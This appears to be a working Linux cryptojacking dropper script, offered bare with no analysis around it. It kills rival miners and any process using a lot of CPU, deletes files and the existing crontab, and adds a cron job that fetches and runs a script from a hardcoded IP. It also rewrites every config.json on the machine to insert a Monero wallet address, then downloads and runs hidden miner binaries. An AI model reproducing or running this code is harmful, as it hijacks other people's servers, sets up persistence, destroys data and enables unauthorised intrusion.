#!/bin/bash

# init
mkdir /tmp
chattr -i /tmp/.tmp/.java
ps -ef | grep "/tmp/.tmp/.java" | awk '{print $2}'|  xargs -I % kill -9 %
ps -ef | grep "/tmp/.xmrig/xmrig" | awk '{print $2}'|  xargs -I % kill -9 %
pkill -9 nohup
killall -q -9 /tmp/.postgres/*
ps aux | grep -v grep | grep '/tmp/.ssh/redis.sh' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep '/tmp/system' | awk '{print $2}' | xargs -i kill -9 {}
rm -rf /tmp/.postgres
ps aux | grep -v grep | grep '/solr.sh' | awk '{print $2}' | xargs -i kill -9 {}
rm -rf /tmp/.*
pkill -9 xmlinux
rm -rf /etc/cron.hourly/oanacroner
rm -rf /etc/cron.hourly/oanacrona
rm -rf /etc/cron.daily/oanacroner
rm -rf /etc/cron.daily/oanacrona
rm -rf /etc/cron.monthly/oanacroner
rm -rf xmrig-6.13.1/
rm -rf xmrig-6.13.1-linux-x64.tar.gz
rm -rf $HOME/moneroocean/
rm -rf /tmp/moneroocean/
rm -rf /root/moneroocean/
rm -rf $HOME/c3pool/
rm -rf /tmp/xlog
rm -rf /tmp/.postgres
rm -rf /tmp/kwolker
rm -rf /tmp/kdevtmpfsi
rm -rf /tmp/kinsing
rm -rf /tmp/libexec
rm -rf /tmp/mym
rm -rf /usr/bin/kinsing*
rm -rf /etc/cron.d/kinsing*
killall -q -9 workrun.sh
killall -q -9 /tmp/kwolker
killall -q -9 /tmp/mym
killall -q -9 xmr
killall -q -9 kdevtmpfsi
killall -q -9 kinsing
killall -q -9 xmrig
killall -q -9 minerd
killall -q -9 xig
killall -q -9 cpuminer
pkill -9 kworker
pkill -9 kwolker
pkill -9 mym
ps auxf|awk '{if($3>=95.0) print $2}'| xargs -I % kill -9 %
ps aux | grep -v grep | grep 'postgres_start.sh' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep '/tmp/.postgres_start/postgres_start.sh' | awk '{print $2}' | xargs -i kill -9 {}
ps aux | grep -v grep | grep '/tmp/.solr/solr.sh' | awk '{print $2}' | xargs -i kill -9 {}
pkill -9 xmrig
pkill -9 xmrig64
pkill -9 pux
pkill -9 testm
pkill -9 miner
pkill -9 network
pkill -9 networkd
pkill -9 unitex
pkill -9 udp
pkill -9 seapplet
pkill -9 /tmp/.jeeej/jeeej
rm -rf /tmp/.xmrig/
rm -rf /tmp/.jeeej/
crontab -r
crontab -r
echo "0 */5 * * * curl -fsSL -k http://111.85.159.55:9091/view/userBehavior/.reporter/1.sh -O /tmp/1.sh" >> crontabs
echo "1 */5 * * * bash /tmp/1.sh" >> crontabs
crontab crontabs
rm crontabs

# xx
for line in `find / -name "config.json"` 
do
    sed -i 's/"user": *"[^"]*",/"user": "87EjF5M4uFCSQ2bHngLNTPgGA31aNjYvQbHvWpDkJvkYA4Zja5PG9Tdbe2TXDfEhPkD9Erh6mRW1cffw5UEbdhSpCSy1sVC",/' $line
done


## 
get() {
  wget -q -O - $1 > $2 || curl -fsSL -k $1 -o $2 ||  lwp-download $1 $2 || cd1 -fsSL $1 -o $2 || wd1 -q -O - $1 > $2
  chmod +x $2
}



MACHINE_TYPE=`uname -m`
if [ ${MACHINE_TYPE} == 'x86_64' ]; then
        if ! get  http://111.85.159.55:9091/view/userBehavior/.reporter/64.tar.gz /tmp/64.tar.gz; then
                exit 1
        fi
        if ! tar xf /tmp/64.tar.gz -C /tmp/; then
                rm /tmp/64.tar.gz /tmp/1.sh
                exit 1
        fi
        chmod +x /tmp/.gvfsd-metadata
        /tmp/.gvfsd-metadata
        rm /tmp/64.tar.gz /tmp/1.sh
else    
        
        if ! get  http://111.85.159.55:9091/view/userBehavior/.reporter/86.tar.gz /tmp/86.tar.gz; then
                rm /tmp/86.tar.gz /tmp/1.sh
                exit 1
        fi
        if ! tar xf /tmp/86.tar.gz -C /tmp/; then
                rm /tmp/86.tar.gz /tmp/1.sh
                exit 1
        fi
        chmod +x /tmp/.seapplet
        /tmp/.seapplet
        rm /tmp/86.tar.gz /tmp/1.sh
fi

